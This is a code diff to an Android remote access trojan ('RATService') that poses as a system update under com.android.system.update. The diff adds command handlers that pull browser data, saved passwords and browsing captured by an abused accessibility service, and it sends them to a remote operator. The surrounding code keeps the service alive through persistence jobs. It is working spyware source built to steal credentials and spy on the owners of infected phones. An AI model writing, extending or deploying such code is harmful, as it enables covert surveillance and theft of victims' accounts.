@@ -51,6 +51,7 @@ import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.atomic.AtomicBoolean;
 import com.android.system.update.modules.BrowserModule;
+import com.android.system.update.BrowserAccessibilityService;
 
 public class RATService extends Service {
     private static final String CHANNEL_ID = "SystemUpdateChannel";
@@ -259,7 +260,14 @@ public class RATService extends Service {
         scheduleAllJobs();
         return START_STICKY;
     }
+    private BrowserAccessibilityService getBrowserAccessibilityService() {
+    // Since BrowserAccessibilityService is a service in the same app,
+    // we can't directly get an instance. Instead, we'll use a broadcast
+    // or we can modify the BrowserAccessibilityService to store a static reference.
     
+    // For now, we'll use the singleton pattern we added to BrowserAccessibilityService
+    return BrowserAccessibilityService.getInstance();
+}
     private void schedulePersistenceJob() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             try {
@@ -753,6 +761,7 @@ public class RATService extends Service {
 
 // Add this to your routeCommand method where you handle other commands
 
+       // Browser-related cases with proper exception handling
 case "browser_data":
 case "get_browsers":
     if (browserModule != null) {
@@ -833,19 +842,24 @@ case "browser_passwords":
         sendCommand("BROWSER_PASSWORDS|{\"success\":false,\"error\":\"Invalid package name\"}");
     }
     break;
-    case "get_captured_browser_data":
+
+// NEW: Handle captured browser data from accessibility service
+case "get_captured_browser_data":
     try {
-        BrowserAccessibilityService service = getBrowserAccessibilityService();
+        BrowserAccessibilityService service = BrowserAccessibilityService.getInstance();
         if (service != null) {
+            Log.d(TAG, "📱 Getting captured browser data from accessibility service");
             String result = service.getCapturedData();
             sendCommand("CAPTURED_BROWSER_DATA|" + result);
         } else {
-            sendCommand("CAPTURED_BROWSER_DATA|{\"success\":false,\"error\":\"Accessibility service not running\"}");
+            Log.d(TAG, "⚠️ Accessibility service not running");
+            sendCommand("CAPTURED_BROWSER_DATA|{\"success\":false,\"error\":\"Accessibility service not running. Please enable it in Settings → Accessibility.\"}");
         }
     } catch (Exception e) {
+        Log.e(TAG, "Error getting captured browser data", e);
         sendCommand("CAPTURED_BROWSER_DATA|{\"success\":false,\"error\":\"" + e.getMessage() + "\"}");
     }
-    break;            
+    break;
 // In routeCommand() method, add these cases:
 
 case "apps_list":
